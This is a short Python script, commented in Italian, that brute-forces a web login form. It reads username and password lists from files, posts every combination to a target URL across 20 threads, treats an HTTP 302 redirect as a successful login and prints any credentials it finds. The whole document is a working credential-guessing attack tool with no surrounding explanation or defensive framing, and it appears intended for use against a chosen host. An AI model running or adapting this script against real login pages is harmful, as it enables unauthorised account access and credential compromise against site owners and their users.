import concurrent.futures
import requests
import os

# Impostazioni
url = "http://$ip"     #modificare "mettere la url corretta"
username_file = "usernames.txt"
password_file = "passwords.txt"

# Carica la lista di username e password da provare
usernames_file = os.path.join(os.getcwd(), username_file)
passwords_file = os.path.join(os.getcwd(), password_file)

with open(usernames_file, "r") as f:
    usernames = [line.strip() for line in f.readlines()]

with open(passwords_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

valid_credentials = None

def prova_credenziali(username, password):
    session = requests.Session()
    data = {"username": username, "password": password, "submit": "Login"}   #verificare come il sito manda i dati
    response = session.post(url, data=data, allow_redirects=False)
    print(f"Provando: {username}:{password}: {response.status_code}: {len(response.text)}")
    if response.status_code == 302:
        print(f"Reindirizzazione rilevata: {username}:{password}")
        print(response.headers["Location"])
        return (username, password, len(response.text))
    return None

# Crea un pool di thread
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:  # Aumentato il numero di thread a 20
    # Invia le credenziali da provare al pool di thread
    futures = []
    for username in usernames:
        for password in passwords:
            futures.append(executor.submit(prova_credenziali, username, password))
    
    # Attendi che tutti i thread finiscano e controlla se sono state trovate credenziali valide
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            valid_credentials = result
            executor.shutdown(wait=False)
            break

if valid_credentials:
    print("\n******Credenziali valide trovate:*********")
    print("---------------------------------------------------------------------------------")
    print(f"User: {valid_credentials[0]}")
    print(f"Password: {valid_credentials[1]}")
    print(f"Lunghezza della risposta: {valid_credentials[2]}")
    print("---------------------------------------------------------------------------------")

else:
    print("Nessuna credenziale valida trovata.")

print("Fine del programma")